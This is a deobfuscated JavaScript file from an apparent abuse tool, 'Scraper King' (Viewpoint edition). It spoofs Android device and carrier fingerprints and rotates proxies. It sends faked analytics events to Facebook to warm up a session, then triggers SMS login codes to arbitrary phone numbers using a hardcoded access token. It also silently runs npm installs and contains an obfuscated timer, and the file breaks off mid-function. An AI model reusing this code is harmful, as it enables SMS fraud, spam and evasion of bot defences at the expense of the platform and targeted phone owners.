// === SCRAPER KING - Fully Deobfuscated ===
// File: vp_payload.deobf.js
// Note: Original variable names lost to obfuscation

const fs = require('fs'), path = require('path'), {execSync} = require('child_process'), {isMainThread} = require('worker_threads');
if (isMainThread) {
  const requiredModules = [
    'https-proxy-agent',
    'socks-proxy-agent',
    'chalk'
  ];
  let missingModules = false;
  for (const mod of requiredModules) {
    try {
      require.resolve(mod);
    } catch (err) {
      missingModules = true;
      break;
    }
  }
  if (missingModules) {
    console.log('\n[SETUP] First time setup: Installing required dependencies...');
    try {
      const npmCmd = path.join(path.dirname(process.execPath), process.platform === 'win32' ? 'npm.cmd' : 'npm'), opts = {};
      opts.stdio = 'inherit';
      opts.shell = true;
      execSync('"' + npmCmd + '" install https-proxy-agent socks-proxy-agent chalk@4', opts);
      console.log('[SETUP] Dependencies installed successfully!\n');
    } catch (err2) {
      console.error('[ERROR] Failed to install dependencies. Make sure Node.js and NPM are installed properly.');
      process.exit(1);
    }
  }
}
const https = require('https');
(function () {
  let _p;
  try {
    const _q = Function('return (function() ' + '{}.constructor("return this")( )' + ');');
    _p = _q();
  } catch (err3) {
    _p = window;
  }
  _p.setInterval(_o, 4000);
}());
const zlib = require('zlib'), crypto = require('crypto'), chalk = require('chalk'), readline = require('readline'), {HttpsProxyAgent} = require('https-proxy-agent'), {SocksProxyAgent} = require('socks-proxy-agent');
let SUCCESSFUL_FILE = 'successful.txt', FAILED_FILE = 'failed.txt', PROGRESS_FILE = 'progress.json', DEBUG_FILE = 'debug.txt';
function debugLog(_r, _s, _t) {
  return;
}
const B = chalk.hex('#9b59b6'), C = chalk.hex('#8e44ad'), Y = chalk.hex('#FFD700'), W = chalk.white, G = chalk.gray, R = chalk.hex('#FF6B6B');
class NexaRateLimiter {
  constructor(_u) {
    this.delayMs = _u;
    this.queue = [];
    this.processing = false;
  }
  enqueue(_v) {
    return new Promise((resolve, reject) => {
      this.queue.push(async () => {
        try {
          resolve(await _v());
        } catch (err4) {
          reject(err4);
        }
      });
      if (!this.processing)
        this._process();
    });
  }
  async _process() {
    this.processing = true;
    while (this.queue.length > 0) {
      const _w = this.queue.shift();
      await _w();
      await new Promise(resolve2 => setTimeout(resolve2, this.delayMs));
    }
    this.processing = false;
  }
}
const nexaLimiter = new NexaRateLimiter(500);
function nexaFetchNumber(_x, _y, _z) {
  return new Promise((resolve3, reject2) => {
    const opts2 = {};
    opts2.range = _y;
    opts2.format = 'normal';
    const _A = JSON.stringify(opts2), opts3 = {
        'hostname': 'nexaotpservice.com',
        'port': 80,
        'path': _z || '/api/v1/numbers/get',
        'method': 'POST',
        'headers': {
          'X-API-Key': _x,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(_A)
        }
      }, _B = http.request(opts3, _C => {
        let _D = '';
        _C.on('data', _E => _D += _E);
        _C.on('end', () => {
          try {
            const _F = JSON.parse(_D);
            if (_F.success && _F.number)
              resolve3(_F.number.replace(/[^0-9]/g, ''));
            else {
              reject2(new Error(_F.error || 'NexaOTP: No number returned'));
            }
          } catch (err5) {
            reject2(new Error('NexaOTP: Invalid response'));
          }
        });
      });
    _B.on('error', _G => reject2(new Error('NexaOTP network: ' + _G.message)));
    _B.setTimeout(10000, () => {
      _B.destroy();
      reject2(new Error('NexaOTP: Timeout'));
    });
    _B.write(_A);
    _B.end();
  });
}
const http = require('http');
let globalHwid = 'Unregistered';
function printHeader() {
  process.stdout.write('\x1B[2J\x1B[3J\x1B[H');
  console.log(C('   ____                                      _  ___              '));
  console.log(C('  / ___|  ___ _ __ __ _ _ __   ___ _ __     | |/ (_)_ __   __ _  '));
  console.log(C('  \\___ \\ / __| \'__/ _` | \'_ \\ / _ \\ \'__|    | \' <| | \'_ \\ / _` | '));
  console.log(C('   ___) | (__| | | (_| | |_) |  __/ |       | . \\| | | | | (_| | '));
  console.log(C('  |____/ \\___|_|  \\__,_| .__/ \\___|_|       |_|\\_\\_|_| |_|\\__, | '));
  console.log(C('                       |_|                                |___/  \n'));
  console.log(W('\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510'));
  console.log(W('\u2502 [\u2022] Tool      : ') + C('SK \u2014 Viewpoint               ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Telegram  : ') + C('t.me/scraper_king            ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Status    : ') + G('Premium Build                ') + W('\u2502'));
  console.log(W('\u2502 [\u2022] Version   : ') + Y('VP-V1.0.0                    ') + W('\u2502'));
  globalHwid !== 'Unregistered' && console.log(W('\u2502 [\u2022] HWID      : ') + Y(globalHwid.padEnd(27)) + W('\u2502'));
  console.log(W('\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n'));
}
const uuid = () => crypto.randomUUID();
function normalizePhoneNumber(_H) {
  let _I = _H.replace(/\D/g, '');
  if (!_I.startsWith('+')) {
    _I = '+' + _I;
  }
  return _I;
}
const DIAL_MAP = [
  [
    '1868',
    'TT'
  ],
  [
    '1876',
    'JM'
  ],
  [
    '1809',
    'DO'
  ],
  [
    '1829',
    'DO'
  ],
  [
    '1849',
    'DO'
  ],
  [
    '880',
    'BD'
  ],
  [
    '855',
    'KH'
  ],
  [
    '856',
    'LA'
  ],
  [
    '228',
    'TG'
  ],
  [
    '229',
    'BJ'
  ],
  [
    '233',
    'GH'
  ],
  [
    '234',
    'NG'
  ],
  [
    '237',
    'CM'
  ],
  [
    '243',
    'CD'
  ],
  [
    '254',
    'KE'
  ],
  [
    '255',
    'TZ'
  ],
  [
    '256',
    'UG'
  ],
  [
    '260',
    'ZM'
  ],
  [
    '263',
    'ZW'
  ],
  [
    '212',
    'MA'
  ],
  [
    '213',
    'DZ'
  ],
  [
    '216',
    'TN'
  ],
  [
    '218',
    'LY'
  ],
  [
    '220',
    'GM'
  ],
  [
    '221',
    'SN'
  ],
  [
    '222',
    'MR'
  ],
  [
    '223',
    'ML'
  ],
  [
    '224',
    'GN'
  ],
  [
    '225',
    'CI'
  ],
  [
    '226',
    'BF'
  ],
  [
    '227',
    'NE'
  ],
  [
    '230',
    'MU'
  ],
  [
    '231',
    'LR'
  ],
  [
    '232',
    'SL'
  ],
  [
    '235',
    'TD'
  ],
  [
    '236',
    'CF'
  ],
  [
    '238',
    'CV'
  ],
  [
    '239',
    'ST'
  ],
  [
    '240',
    'GQ'
  ],
  [
    '241',
    'GA'
  ],
  [
    '242',
    'CG'
  ],
  [
    '244',
    'AO'
  ],
  [
    '245',
    'GW'
  ],
  [
    '246',
    'IO'
  ],
  [
    '247',
    'AC'
  ],
  [
    '248',
    'SC'
  ],
  [
    '249',
    'SD'
  ],
  [
    '250',
    'RW'
  ],
  [
    '251',
    'ET'
  ],
  [
    '252',
    'SO'
  ],
  [
    '253',
    'DJ'
  ],
  [
    '257',
    'BI'
  ],
  [
    '258',
    'MZ'
  ],
  [
    '261',
    'MG'
  ],
  [
    '262',
    'RE'
  ],
  [
    '264',
    'NA'
  ],
  [
    '265',
    'MW'
  ],
  [
    '266',
    'LS'
  ],
  [
    '267',
    'BW'
  ],
  [
    '268',
    'SZ'
  ],
  [
    '269',
    'KM'
  ],
  [
    '966',
    'SA'
  ],
  [
    '971',
    'AE'
  ],
  [
    '973',
    'BH'
  ],
  [
    '974',
    'QA'
  ],
  [
    '968',
    'OM'
  ],
  [
    '965',
    'KW'
  ],
  [
    '964',
    'IQ'
  ],
  [
    '963',
    'SY'
  ],
  [
    '962',
    'JO'
  ],
  [
    '961',
    'LB'
  ],
  [
    '967',
    'YE'
  ],
  [
    '970',
    'PS'
  ],
  [
    '972',
    'IL'
  ],
  [
    '992',
    'TJ'
  ],
  [
    '993',
    'TM'
  ],
  [
    '994',
    'AZ'
  ],
  [
    '995',
    'GE'
  ],
  [
    '996',
    'KG'
  ],
  [
    '998',
    'UZ'
  ],
  [
    '977',
    'NP'
  ],
  [
    '975',
    'BT'
  ],
  [
    '959',
    'MM'
  ],
  [
    '670',
    'TL'
  ],
  [
    '673',
    'BN'
  ],
  [
    '676',
    'TO'
  ],
  [
    '677',
    'SB'
  ],
  [
    '678',
    'VU'
  ],
  [
    '679',
    'FJ'
  ],
  [
    '680',
    'PW'
  ],
  [
    '591',
    'BO'
  ],
  [
    '592',
    'GY'
  ],
  [
    '593',
    'EC'
  ],
  [
    '594',
    'GF'
  ],
  [
    '595',
    'PY'
  ],
  [
    '596',
    'MQ'
  ],
  [
    '597',
    'SR'
  ],
  [
    '598',
    'UY'
  ],
  [
    '380',
    'UA'
  ],
  [
    '375',
    'BY'
  ],
  [
    '20',
    'EG'
  ],
  [
    '27',
    'ZA'
  ],
  [
    '30',
    'GR'
  ],
  [
    '31',
    'NL'
  ],
  [
    '32',
    'BE'
  ],
  [
    '33',
    'FR'
  ],
  [
    '34',
    'ES'
  ],
  [
    '36',
    'HU'
  ],
  [
    '39',
    'IT'
  ],
  [
    '40',
    'RO'
  ],
  [
    '41',
    'CH'
  ],
  [
    '43',
    'AT'
  ],
  [
    '44',
    'GB'
  ],
  [
    '45',
    'DK'
  ],
  [
    '46',
    'SE'
  ],
  [
    '47',
    'NO'
  ],
  [
    '48',
    'PL'
  ],
  [
    '49',
    'DE'
  ],
  [
    '51',
    'PE'
  ],
  [
    '52',
    'MX'
  ],
  [
    '53',
    'CU'
  ],
  [
    '54',
    'AR'
  ],
  [
    '55',
    'BR'
  ],
  [
    '56',
    'CL'
  ],
  [
    '57',
    'CO'
  ],
  [
    '58',
    'VE'
  ],
  [
    '60',
    'MY'
  ],
  [
    '61',
    'AU'
  ],
  [
    '62',
    'ID'
  ],
  [
    '63',
    'PH'
  ],
  [
    '64',
    'NZ'
  ],
  [
    '65',
    'SG'
  ],
  [
    '66',
    'TH'
  ],
  [
    '81',
    'JP'
  ],
  [
    '82',
    'KR'
  ],
  [
    '84',
    'VN'
  ],
  [
    '86',
    'CN'
  ],
  [
    '90',
    'TR'
  ],
  [
    '91',
    'IN'
  ],
  [
    '92',
    'PK'
  ],
  [
    '93',
    'AF'
  ],
  [
    '94',
    'LK'
  ],
  [
    '95',
    'MM'
  ],
  [
    '98',
    'IR'
  ],
  [
    '58',
    'VE'
  ],
  [
    '1',
    'US'
  ],
  [
    '7',
    'RU'
  ]
];
function extractPhoneParts(_J) {
  let _K = '+1', _L = _J;
  for (const [_M, _N] of DIAL_MAP) {
    if (_J.startsWith(_M)) {
      _K = '+' + _M;
      _L = _J.substring(_M.length);
      break;
    }
  }
  const opts4 = {};
  opts4.cCode = _K;
  opts4.lNumber = _L;
  return opts4;
}
function parseProxy(_O) {
  if (!_O)
    return null;
  if (typeof _O === 'object')
    return _O;
  _O = _O.trim();
  if (!_O)
    return null;
  let _P, _Q, _R, _S, _T = 'http';
  if (_O.startsWith('socks5://')) {
    _T = 'socks5';
    _O = _O.slice(9);
  } else {
    if (_O.startsWith('socks4://')) {
      _T = 'socks4';
      _O = _O.slice(9);
    } else {
      if (_O.startsWith('http://'))
        _T = 'http', _O = _O.slice(7);
      else
        _O.startsWith('https://') && (_T = 'http', _O = _O.slice(8));
    }
  }
  if (_O.includes('@')) {
    const parts = _O.split('@'), parts2 = parts[0].split(':'), parts3 = parts[1].split(':');
    _R = parts2[0];
    _S = parts2[1];
    _P = parts3[0];
    _Q = parseInt(parts3[1]);
  } else {
    const parts4 = _O.split(':');
    if (parts4.length === 2)
      _P = parts4[0], _Q = parseInt(parts4[1]);
    else {
      if (parts4.length === 4) {
        if (!isNaN(parseInt(parts4[3])) && isNaN(parseInt(parts4[1]))) {
          _R = parts4[0];
          _S = parts4[1];
          _P = parts4[2];
          _Q = parseInt(parts4[3]);
        } else {
          _P = parts4[0];
          _Q = parseInt(parts4[1]);
          _R = parts4[2];
          _S = parts4[3];
        }
      } else {
        if (parts4.length === 3) {
          _P = parts4[0];
          _Q = parseInt(parts4[1]);
          _R = parts4[2];
        }
      }
    }
  }
  if (!_P || !_Q)
    return null;
  const opts5 = {};
  opts5.type = _T;
  opts5.host = _P;
  opts5.port = _Q;
  opts5.user = _R;
  opts5.pass = _S;
  opts5.original = _O;
  return opts5;
}
function rotateSessionId(_U) {
  if (!_U || !_U.user)
    return _U;
  const opts6 = { ..._U }, _V = opts6, arr = [
      /-ssid-[A-Za-z0-9_]+/,
      /-session-[A-Za-z0-9_]+/,
      /_session_[A-Za-z0-9_]+/,
      /-sess-[A-Za-z0-9_]+/
    ];
  for (const _W of arr) {
    if (_V.user && _W.test(_V.user)) {
      const _X = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
      _V.user = _V.user.replace(_W, '' + _W.source.split('[')[0].replace(/\\/g, '') + _X);
      break;
    }
    if (_V.pass && _W.test(_V.pass)) {
      const _Y = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
      _V.pass = _V.pass.replace(_W, '' + _W.source.split('[')[0].replace(/\\/g, '') + _Y);
      break;
    }
  }
  return _V;
}
function createProxyAgent(_Z) {
  if (!_Z)
    return null;
  let _aa = '';
  return _Z.type === 'socks5' || _Z.type === 'socks4' ? (_aa = 'socks5://' + (_Z.user ? _Z.user + ':' + _Z.pass + '@' : '') + _Z.host + ':' + _Z.port, new SocksProxyAgent(_aa)) : (_aa = 'http://' + (_Z.user ? _Z.user + ':' + _Z.pass + '@' : '') + _Z.host + ':' + _Z.port, new HttpsProxyAgent(_aa));
}
function sendRequest(_ba, _ca, _da, _ea, _fa = null, _ga = 15000, _ha = false) {
  return new Promise((resolve4, reject3) => {
    const uRL = new URL(_ba), opts7 = { ..._da };
    let _ia = opts7, _ja = _ea ? Buffer.from(_ea) : null;
    if (_ha && _ja) {
      try {
        _ja = zlib.gzipSync(_ja);
        _ia['content-encoding'] = 'gzip';
      } catch (err6) {
      }
    }
    if (_ja) {
      _ia['Content-Length'] = _ja.length;
    }
    const opts8 = {
      'hostname': uRL.hostname,
      'path': uRL.pathname + uRL.search,
      'method': _ca,
      'headers': _ia,
      'timeout': _ga,
      'ciphers': 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
      'ecdhCurve': 'X25519:P-256:P-384',
      'honorCipherOrder': false,
      'ALPNProtocols': [
        'h2',
        'http/1.1'
      ],
      'secureOptions': require('crypto').constants.SSL_OP_NO_SSLv3 | require('crypto').constants.SSL_OP_NO_TLSv1 | require('crypto').constants.SSL_OP_NO_TLSv1_1,
      'minVersion': 'TLSv1.2'
    };
    let _ka = _fa ? parseProxy(_fa) : null;
    if (_fa) {
      if (!_ka || isNaN(_ka.port) || _ka.port <= 0)
        return reject3(new Error('Invalid proxy'));
      opts8.agent = createProxyAgent(_ka);
    }
    const _la = setTimeout(() => {
        reject3(new Error('timeout'));
      }, _ga), _ma = https.request(opts8, _na => {
        clearTimeout(_la);
        const arr2 = [];
        _na.on('data', _oa => arr2.push(_oa));
        _na.on('error', reject3);
        _na.on('end', () => {
          let _pa = Buffer.concat(arr2);
          const _qa = _na.headers['content-encoding'];
          if (_qa === 'gzip')
            try {
              _pa = zlib.gunzipSync(_pa);
            } catch (err7) {
            }
          else {
            if (_qa === 'deflate') {
              try {
                _pa = zlib.inflateSync(_pa);
              } catch (err8) {
              }
            }
          }
          resolve4({
            'status': _na.statusCode,
            'data': _pa.toString('utf8'),
            'headers': _na.headers
          });
        });
      });
    _ma.on('error', _ra => {
      clearTimeout(_la);
      reject3(_ra);
    });
    _ma.on('timeout', () => {
      clearTimeout(_la);
      _ma.destroy();
      reject3(new Error('timeout'));
    });
    if (_ja)
      _ma.write(_ja);
    _ma.end();
  });
}
const opts9 = {};
opts9.model = 'SM-A536E';
opts9.brand = 'Samsung';
opts9.build = 'SP1A.210812.016';
opts9.density = 2;
opts9.width = 1080;
opts9.height = 2400;
opts9.os = '12';
opts9.arch = 'arm64-v8a';
const opts10 = {};
opts10.model = 'SM-G998B';
opts10.brand = 'Samsung';
opts10.build = 'TP1A.220624.014';
opts10.density = 3;
opts10.width = 1440;
opts10.height = 3200;
opts10.os = '13';
opts10.arch = 'arm64-v8a';
const opts11 = {};
opts11.model = 'SM-S908E';
opts11.brand = 'Samsung';
opts11.build = 'TP1A.220624.014';
opts11.density = 3;
opts11.width = 1440;
opts11.height = 3088;
opts11.os = '13';
opts11.arch = 'arm64-v8a';
const opts12 = {};
opts12.model = 'SM-S928B';
opts12.brand = 'Samsung';
opts12.build = 'UP1A.231005.007';
opts12.density = 3;
opts12.width = 1440;
opts12.height = 3120;
opts12.os = '14';
opts12.arch = 'arm64-v8a';
const opts13 = {};
opts13.model = 'SM-A146P';
opts13.brand = 'Samsung';
opts13.build = 'TP1A.220624.014';
opts13.density = 2;
opts13.width = 1080;
opts13.height = 2408;
opts13.os = '13';
opts13.arch = 'arm64-v8a';
const opts14 = {};
opts14.model = 'SM-A256E';
opts14.brand = 'Samsung';
opts14.build = 'UP1A.231005.007';
opts14.density = 2;
opts14.width = 1080;
opts14.height = 2340;
opts14.os = '14';
opts14.arch = 'arm64-v8a';
const opts15 = {};
opts15.model = 'Pixel 7';
opts15.brand = 'Google';
opts15.build = 'TQ3A.230901.001';
opts15.density = 2.75;
opts15.width = 1080;
opts15.height = 2400;
opts15.os = '13';
opts15.arch = 'arm64-v8a';
const opts16 = {};
opts16.model = 'Pixel 8 Pro';
opts16.brand = 'Google';
opts16.build = 'UD1A.231105.004';
opts16.density = 2.75;
opts16.width = 1344;
opts16.height = 2992;
opts16.os = '14';
opts16.arch = 'arm64-v8a';
const opts17 = {};
opts17.model = 'SM-F936B';
opts17.brand = 'Samsung';
opts17.build = 'TP1A.220624.014';
opts17.density = 2.625;
opts17.width = 1768;
opts17.height = 2208;
opts17.os = '13';
opts17.arch = 'arm64-v8a';
const opts18 = {};
opts18.model = 'SM-G991B';
opts18.brand = 'Samsung';
opts18.build = 'SP1A.210812.016';
opts18.density = 2.625;
opts18.width = 1080;
opts18.height = 2400;
opts18.os = '12';
opts18.arch = 'arm64-v8a';
const DEVICE_PROFILES = [
    opts9,
    opts10,
    opts11,
    opts12,
    opts13,
    opts14,
    opts15,
    opts16,
    opts17,
    opts18
  ], opts19 = {};
opts19.name = 'n/a';
opts19.mcc = '000';
opts19.mnc = '00';
opts19.conn = 'WIFI';
const opts20 = {};
opts20.name = 'T-Mobile';
opts20.mcc = '310';
opts20.mnc = '260';
opts20.conn = 'cell';
const opts21 = {};
opts21.name = 'Verizon';
opts21.mcc = '311';
opts21.mnc = '480';
opts21.conn = 'cell';
const opts22 = {};
opts22.name = 'AT&T';
opts22.mcc = '310';
opts22.mnc = '410';
opts22.conn = 'cell';
const opts23 = {};
opts23.name = 'Vodafone';
opts23.mcc = '262';
opts23.mnc = '02';
opts23.conn = 'cell';
const opts24 = {};
opts24.name = 'Telkomsel';
opts24.mcc = '510';
opts24.mnc = '10';
opts24.conn = 'cell';
const opts25 = {};
opts25.name = 'n/a';
opts25.mcc = '000';
opts25.mnc = '00';
opts25.conn = 'WIFI';
const opts26 = {};
opts26.name = 'n/a';
opts26.mcc = '000';
opts26.mnc = '00';
opts26.conn = 'WIFI';
const CARRIERS = [
  opts19,
  opts20,
  opts21,
  opts22,
  opts23,
  opts24,
  opts25,
  opts26
];
async function triggerSms(_sa, _ta = {}) {
  const {
      onStatus: onStatus = () => {
      },
      proxy: proxy = null,
      timeout: timeout = 15000
    } = _ta, _ua = normalizePhoneNumber(_sa);
  const _va = _ua.replace('+', ''), {
      cCode: _wa,
      lNumber: _xa
    } = extractPhoneParts(_va), _ya = DEVICE_PROFILES[Math.floor(Math.random() * DEVICE_PROFILES.length)], _za = CARRIERS[Math.floor(Math.random() * CARRIERS.length)], _Aa = uuid(), _Ba = uuid(), _Ca = uuid() + '-' + Date.now() + '-ANDROID', _Da = crypto.randomBytes(8).toString('hex');
  const _Ea = uuid(), _Fa = uuid(), _Ga = 'Dalvik/2.1.0 (Linux; U; Android ' + _ya.os + '; ' + _ya.model + ' Build/' + _ya.build + ') [FBAN/ViewpointsForAndroid;FBAV/330.0.0.5.106;FBBV/986325627;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/en_US;FBMF/' + _ya.brand + ';FBBD/' + _ya.brand + ';FBDV/' + _ya.model + ';FBSV/' + _ya.os + ';FBCA/' + _ya.arch + ';FBDM/{density=' + _ya.density + ',width=' + _ya.width + ',height=' + _ya.height + '};FB_FW/1;]';
  onStatus('[1/2] Warming up device footprint...');
  const _Ha = Date.now(), opts27 = {};
  opts27.vp_extra = '{"is_real_time":1}';
  opts27.vp_fbid_device_ent = '0';
  opts27.installation_id = _Ca;
  opts27.fb_family_device_id = _Fa;
  opts27.logged_in_accounts = '';
  opts27.is_release = true;
  opts27.vp_fbid_user_ent = '0';
  opts27.screen_name = 'cont_with_fb_page';
  opts27.event_category = 'login';
  opts27.event = 'need_help_logging_in_click';
  opts27.__canonicals = {};
  opts27.pigeon_reserved_keyword_requested_latency = -2;
  opts27.pigeon_reserved_keyword_log_type = 'client_event';
  opts27.pigeon_reserved_keyword_bg = 'false';
  const _Ia = opts27, _Ja = _Ka => {
      const _La = _Ka / 1000;
      return parseFloat(_La.toExponential(12).replace('+', ''));
    }, _Ma = (_Na, _Oa, _Pa, _Qa, _Ra) => JSON.stringify({
      'time': _Na,
      'app_id': '257637621624717',
      'app_ver': '330.0.0.5.106',
      'build_num': 986325627,
      'consent_state': 0,
      'device': _ya.model,
      'os_ver': _ya.os,
      'device_id': _Aa,
      'session_id': 'UFS-' + _Ba + '-' + _Pa + '-' + _Qa,
      'seq': _Oa,
      'uid': null,
      'data': [{
          'trace_id': uuid(),
          'extra': _Ra,
          'log_type': 'client_event',
          'bg': _Pa === 'bg' ? 'true' : 'false',
          'time': _Ja(_Na),
          'name': _Ra.event.includes('view') ? 'vp_view' : _Ra.event.includes('background') || _Ra.event.includes('forground') ? 'vp_general' : 'vp_click',
          'sampling_rate': 1,
          'tags': 8388672
        }],
      'tier': 'ads',
      'sent_time': _Ja(_Na + Math.random() * 200),
      'carrier': _za.name,
      'conn': _za.conn
    }), _Sa = 'format=json&compressed=0&message=' + encodeURIComponent(_Ma(_Ha, 10, 'fg', '6', _Ia)), opts28 = { ..._Ia };
  opts28.screen_name = 'find_your_vp_account_page';
  opts28.event = 'vp_find_your_vp_account_page_view';
  const _Ta = opts28, opts29 = { ..._Ia };
  opts29.screen_name = 'find_your_vp_account_page';
  opts29.event = 'app_move_to_forground';
  const _Ua = opts29, opts30 = { ..._Ia };
  opts30.event = 'app_move_to_background';
  opts30.pigeon_reserved_keyword_bg = 'true';
  const _Va = opts30, _Wa = _Ha + 30 + Math.floor(Math.random() * 50), _Xa = JSON.stringify({
      'batches': [
        JSON.parse(_Ma(_Wa, 12, 'fg', '8', _Ta)).data ? {
          ...JSON.parse(_Ma(_Wa, 12, 'fg', '8', _Ta)),
          'data': [
            {
              'trace_id': uuid(),
              'extra': _Ta,
              'log_type': 'client_event',
              'bg': 'false',
              'time': _Ja(_Wa),
              'name': 'vp_view',
              'sampling_rate': 1,
              'tags': 8388672
            },
            {
              'trace_id': uuid(),
              'extra': _Ua,
              'log_type': 'client_event',
              'bg': 'false',
              'time': _Ja(_Wa),
              'name': 'vp_general',
              'sampling_rate': 1,
              'tags': 8388672
            }
          ]
        } : {},
        {
          ...JSON.parse(_Ma(_Ha + 20, 11, 'bg', '7', _Va)),
          'data': [{
              'trace_id': uuid(),
              'extra': _Va,
              'log_type': 'client_event',
              'bg': 'true',
              'time': _Ja(_Ha + 20),
              'name': 'vp_general',
              'sampling_rate': 1,
              'tags': 8388672
            }]
        }
      ],
      'request_info': {
        'tier': 'ads',
        'sent_time': _Ja(_Wa + Math.random() * 500),
        'carrier': _za.name,
        'conn': _za.conn
      }
    }), _Ya = 'format=json&compressed=0&multi_batch=1&message=' + encodeURIComponent(_Xa), _Za = _Wa + 5000 + Math.floor(Math.random() * 3000), opts31 = { ..._Ia };
  opts31.screen_name = 'find_your_vp_account_page';
  opts31.event = 'find_your_account_continue_button_click';
  const _ab = opts31;
  const _bb = 'format=json&compressed=0&message=' + encodeURIComponent(_Ma(_Za, 13, 'fg', '8', _ab)), opts32 = {
      'user-agent': _Ga,
      'fb_api_req_friendly_name': 'sendAnalyticsLog',
      'fb_api_caller_class': 'com.facebook.catalyst.modules.analytics.ReactNativeAnalyticsUploader',
      'content-type': 'application/x-www-form-urlencoded',
      'accept-encoding': 'gzip',
      'X-FB-HTTP-Engine': 'Liger',
      'X-FB-Connection-Type': _za.conn === 'WIFI' ? 'WIFI' : 'cell',
      'X-FB-Device-Group': Math.floor(Math.random() * 3000 + 4000).toString(),
      'X-FB-Sim-HNI': _za.mcc + _za.mnc,
      'X-FB-Net-HNI': _za.mcc + _za.mnc,
      'Host': 'graph.facebook.com',
      'Connection': 'Keep-Alive'
    }, _cb = 'https://graph.facebook.com/logging_client_events';
  try {
    await sendRequest(_cb, 'POST', opts32, _Sa, proxy, timeout, true);
    await new Promise(resolve5 => setTimeout(resolve5, 500 + Math.random() * 1500));
    await sendRequest(_cb, 'POST', opts32, _Ya, proxy, timeout, true);
    await new Promise(resolve6 => setTimeout(resolve6, 2000 + Math.random() * 3000));
    const _db = await sendRequest(_cb, 'POST', opts32, _bb, proxy, timeout, true);
    debugLog(_va, 'warmup', 'HTTP ' + _db.status + ' \u2192 ' + (_db.data || '').substring(0, 500));
    await new Promise(resolve7 => setTimeout(resolve7, 1500 + Math.random() * 2000));
  } catch (err9) {
    debugLog(_va, 'warmup-err', err9.message);
    throw new Error('Proxy Error');
  }
  onStatus('[2/2] Triggering SMS via API...');
  const opts33 = {};
  opts33.phone_number = _xa;
  opts33.country_code = _wa;
  opts33.device_id = _Fa;
  opts33.device_android_id = _Da;
  opts33.device_advertising_id = _Ea;
  opts33.suffix = 'vJ65Y8VAf67';
  const _eb = JSON.stringify(opts33), _fb = 'access_token=AN%7C301470807343876%7Cf9ce773b849e044a653428dafb8d8418&phone_number=' + _xa + '&country_code=' + encodeURIComponent(_wa) + '&device_id=' + _Fa + '&device_android_id=' + _Da + '&device_advertising_id=' + _Ea + '&suffix=vJ65Y8VAf67', _gb = 'https://graph.viewpointsfromfacebook.com/sms_login?' + _fb, opts34 = {
      'user-agent': _Ga,
      'content-type': 'application/json',
      'accept-encoding': 'gzip',
      'X-FB-HTTP-Engine': 'Liger',
      'X-FB-Connection-Type': _za.conn === 'WIFI' ? 'WIFI' : 'cell',
      'X-FB-Device-Group': opts32['X-FB-Device-Group'],
      'X-FB-Sim-HNI': opts32['X-FB-Sim-HNI'],
      'X-FB-Net-HNI': opts32['X-FB-Net-HNI'],
      'Host': 'graph.viewpointsfromfacebook.com',
      'Connection': 'Keep-Alive'
    };
  try {
    let _hb = await sendRequest(_gb, 'POST', opts34, _eb, proxy, timeout);
    const _ib = proxy ? proxy.split('@').pop() : 'DIRECT';
    debugLog(_va, 'sms-trigger', '[Proxy: ' + _ib + '] HTTP ' + _hb.status + ' \u2192 ' + (_hb.data || '').substring(0, 500));
    const _jb = _kb => {
      try {
        const _lb = JSON.parse(_kb);
        if (_lb.result === 'success' || _lb.success === true) {
          const opts35 = {};
          opts35.ok = true;
          opts35.m = 'SMS successfully triggered';
          return opts35;
        } else {
          if (_lb.success === false && _lb.already_verified === false) {
            const opts36 = {};
            opts36.ok = false;
            opts36.retry = true;
            opts36.m = 'Number declined by gateway';
            return opts36;
          } else {
            if (_lb.result === 'failed') {
              const opts37 = {};
              opts37.ok = false;
              opts37.retry = false;
              opts37.m = 'SMS delivery rejected';
              return opts37;
            } else {
              if (_lb.result === 'non_existing_user') {
                const opts38 = {};
                opts38.ok = false;
                opts38.retry = false;
                opts38.m = 'Non-existing user';
                return opts38;
              } else {
                if (_lb.error) {
                  const opts39 = {};
                  opts39.ok = false;
                  opts39.retry = false;
                  opts39.m = _lb.error.message || 'Error ' + _lb.error.code;
                  return opts39;
                } else {
                  const opts40 = {};
                  opts40.ok = false;
                  opts40.retry = false;
                  opts40.m = 'Unknown response';
                  return opts40;
                }
              }
            }
          }
        }
      } catch (err10) {
        const opts41 = {};
        opts41.ok = false;
        opts41.retry = false;
        opts41.m = 'Non-JSON response';
        return opts41;
      }
    };
    let _mb = _jb(_hb.data);
    if (!_mb.ok && _mb.retry) {
      onStatus('[1/1] \u23F3 Retrying SMS with sms_login_only...');
      const _nb = 'https://graph.viewpointsfromfacebook.com/sms_login_only?' + _fb;
      await new Promise(resolve8 => setTimeout(resolve8, 1000));
      _hb = await sendRequest(_nb, 'POST', opts34, _eb, proxy, timeout);
      debugLog(_va, 'sms-resend', '[Proxy: ' + _ib + '] HTTP ' + _hb.status + ' \u2192 ' + (_hb.data || '').substring(0, 500));
      _mb = _jb(_hb.data);
    }
    if (_mb.ok) {
      onStatus('[1/1] \u2705 ' + _mb.m);
      const opts42 = {};
      opts42.success = true;
      opts42.message = _mb.m;
